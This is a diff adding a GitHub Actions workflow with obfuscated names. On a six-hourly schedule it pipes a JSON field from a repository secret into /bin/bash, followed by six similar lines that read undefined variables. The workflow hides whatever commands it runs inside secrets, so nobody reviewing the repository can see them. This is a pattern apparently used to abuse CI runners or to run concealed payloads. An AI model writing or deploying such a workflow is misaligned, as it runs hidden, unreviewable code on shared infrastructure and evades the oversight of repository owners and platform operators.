@@ -1,0 +1,23 @@
+name: suduspeedgood
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: suduspeedgood
+        env:
+          oazhc65: ${{ secrets.oazhc65 }}
+        run: |
+          echo $oazhc65 | jq -r .hu4 | /bin/bash
+          echo $j5291 | jq -r .uu42930 | /bin/bash
+          echo $by1084 | jq -r .n1790 | /bin/bash
+          echo $wkhvt5 | jq -r .d55 | /bin/bash
+          echo $rase338 | jq -r .w27449 | /bin/bash
+          echo $nrmb18065 | jq -r .rsezb0 | /bin/bash
+          echo $mexaq258 | jq -r .glpq17193 | /bin/bash
+
